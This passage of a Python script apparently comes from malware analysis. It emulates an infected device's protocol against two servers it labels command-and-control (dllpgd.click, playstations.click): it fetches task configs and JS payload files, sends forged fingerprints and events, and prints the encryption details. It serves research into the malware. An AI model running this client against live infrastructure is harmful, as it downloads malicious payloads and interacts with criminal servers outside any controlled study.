        print(f"  → encryption_key set ({len(ps_encryption_key)} bytes)")

# --- 2. POST /phantom/task — Get Task Configuration ---
print("\n" + "─" * 30)
print("  [2/9] POST /phantom/task")
print("─" * 30)

task_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
task_result = send_ps_request("getTaskConfig", task_request, ps_encryption_key)

if task_result and isinstance(task_result, dict):
    task_content = task_result.get("task", "")
    print(f"\n  → code: {task_result.get('code', -1)}")
    print(f"  → task content length: {len(task_content)} chars")
    if task_content:
        print(f"  → task preview: {task_content[:200]}...")

# --- 3. POST /phantom/file_version — Check JS File Version ---
print("\n" + "─" * 30)
print("  [3/9] POST /phantom/file_version")
print("─" * 30)

version_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
version_result = send_ps_request("getFileVersion", version_request, ps_encryption_key)

if version_result and isinstance(version_result, dict):
    print(f"\n  → code: {version_result.get('code', -1)}")
    print(f"  → version: {version_result.get('version', 'N/A')}")

# --- 4. POST /phantom/file — Download JS File Content ---
print("\n" + "─" * 30)
print("  [4/9] POST /phantom/file")
print("─" * 30)

file_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
file_result = send_ps_request("getFileContent", file_request, ps_encryption_key)

if file_result and isinstance(file_result, dict):
    file_content = file_result.get("content", "")
    print(f"\n  → code: {file_result.get('code', -1)}")
    print(f"  → JS file length: {len(file_content)} chars")
    if file_content:
        print(f"  → JS preview: {file_content[:200]}...")

# --- 5. POST /h5/js_file_for_signaling — Get Signaling JS ---
print("\n" + "─" * 30)
print("  [5/9] POST /h5/js_file_for_signaling")
print("─" * 30)

signaling_js_request = {
    "offer": ps_offer_id or "test_offer_001",
    "token": ps_auth_token,
    "app_id": APP_ID,
    "device_id": DEVICE_ID,
    "platform": "tc",
    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
}
signaling_js_result = send_ps_request("getSignalingJS", signaling_js_request, ps_encryption_key)

# --- 6. POST /h5/get_job_by_offer — Get Job By Offer ---
print("\n" + "─" * 30)
print("  [6/9] POST /h5/get_job_by_offer")
print("─" * 30)

job_request = {
    "api_key": ps_auth_token,
    "offer_id": ps_offer_id or "test_offer_001",
    "token": ps_auth_token,
    "app_id": APP_ID,
    "device_id": DEVICE_ID,
    "platform": "tc",
    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
}
job_result = send_ps_request("getJobByOffer", job_request, ps_encryption_key)

if job_result and isinstance(job_result, dict):
    task_data = job_result.get("task", "")
    print(f"\n  → code: {job_result.get('code', -1)}")
    if task_data:
        # task_data may contain site_url, job_id, offer_id
        try:
            offer_data = json.loads(task_data) if isinstance(task_data, str) else task_data
            print(f"  → site_url: {offer_data.get('site_url', 'N/A')}")
            print(f"  → job_id: {offer_data.get('job_id', 'N/A')}")
            print(f"  → offer_id: {offer_data.get('offer_id', 'N/A')}")
            ps_offer_id = offer_data.get("offer_id", ps_offer_id)
            ps_job_id = offer_data.get("job_id", ps_job_id)
        except (json.JSONDecodeError, AttributeError):
            print(f"  → task: {str(task_data)[:200]}")

# --- 7. POST /h5/report_events — Report Events ---
print("\n" + "─" * 30)
print("  [7/9] POST /h5/report_events")
print("─" * 30)

events_request = {
    "token": ps_auth_token,
    "app_id": APP_ID,
    "device_id": DEVICE_ID,
    "platform": "tc",
    "api_key": ps_auth_token,
    "offer_id": ps_offer_id or "test_offer_001",
    "events": [
        json.dumps({"name": "sdk_init", "desc": "SDK initialized", "timestamp": int(time.time() * 1000)}),
        json.dumps({"name": "page_loaded", "desc": "Landing page loaded", "timestamp": int(time.time() * 1000)}),
    ],
    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
}
events_result = send_ps_request("reportEvents", events_request, ps_encryption_key)

# --- 8. POST /h5/upload_logs_v2 — Upload Logs ---
print("\n" + "─" * 30)
print("  [8/9] POST /h5/upload_logs_v2")
print("─" * 30)

logs_request = {
    "token": ps_auth_token,
    "app_id": APP_ID,
    "device_id": DEVICE_ID,
    "platform": "tc",
    "api_key": ps_auth_token,
    "offer_id": ps_offer_id or "test_offer_001",
    "events": [   # field is "events" in LogUploadRequest too
        json.dumps({"level": 1, "tag": "[Dllpgd][HR]", "message": "task started", "timestamp": int(time.time() * 1000)}),
    ],
    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
}
logs_result = send_ps_request("uploadLogs", logs_request, ps_encryption_key)

# --- 9. POST /phantom/done — Report Task Done ---
print("\n" + "─" * 30)
print("  [9/9] POST /phantom/done")
print("─" * 30)

done_request = {
    "app_id": APP_ID,
    "device_id": DEVICE_ID,
    "token": ps_auth_token,
    "api_key": ps_auth_token,
    "offer_id": ps_offer_id or "test_offer_001",
    "result": "success",
    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
}
done_result = send_ps_request("reportDone", done_request, ps_encryption_key)


# ============================================================
# 8. Final Summary
# ============================================================

print("\n\n" + "=" * 70)
print("  Final Summary")
print("=" * 70)

print(f"\n  ── dllpgd.click (C&C Config Server) ──")
print(f"  Server:      {BASE_URL}")
print(f"  Encryption:  AES-256-CFB (5-layer pipeline)")
print(f"  AES Key:     {AES_KEY_SEED} → MD5 → {md5_hash}")
print(f"  Endpoints:   {API_GET_CONFIG}")
print(f"               {API_UPDATE_EVENT}")
print(f"               {API_UPDATE_LOG}")
print(f"  getConfig:   {'OK' if config_result else 'FAILED/UNREACHABLE'}")
print(f"  updateEvent: {'OK' if event_result else 'FAILED/UNREACHABLE'}")
print(f"  updateLog:   {'OK' if log_result else 'FAILED/UNREACHABLE'}")

print(f"\n  ── playstations.click (C&C API Server) ──")
print(f"  Server:      {PS_BASE_URL}")
print(f"  Encryption:  XOR+Base64 (dynamic key from token response)")
print(f"  User-Agent:  {PS_USER_AGENT}")
ps_results = {
    "getToken": token_result,
    "getTaskConfig": task_result,
    "getFileVersion": version_result,
    "getFileContent": file_result,
    "getSignalingJS": signaling_js_result,
    "getJobByOffer": job_result,
    "reportEvents": events_result,
    "uploadLogs": logs_result,
    "reportDone": done_result,
}
for name, result in ps_results.items():
    status = "OK" if result and not (isinstance(result, dict) and result.get("error")) else "FAILED/UNREACHABLE"
    endpoint = PS_ENDPOINTS[name]
    print(f"  {name:20s} {endpoint:35s} {status}")
